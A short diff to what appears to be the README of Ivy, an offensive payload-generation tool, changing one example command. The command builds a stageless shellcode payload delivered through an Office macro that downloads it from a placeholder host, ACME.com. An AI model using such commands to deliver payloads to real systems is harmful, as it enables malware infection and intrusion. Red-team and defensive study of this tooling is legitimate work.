@@ -235,7 +235,7 @@ The delivery command line argument allows you to generate a command or string of
 ### Macro Web Downloader
 
 ```
-./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.txt -url http://ACME.com/test.txt -delivery macro -stageless
+./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.txt -url http://ACME.com -delivery macro -stageless
 ```
 
 # Known Issues
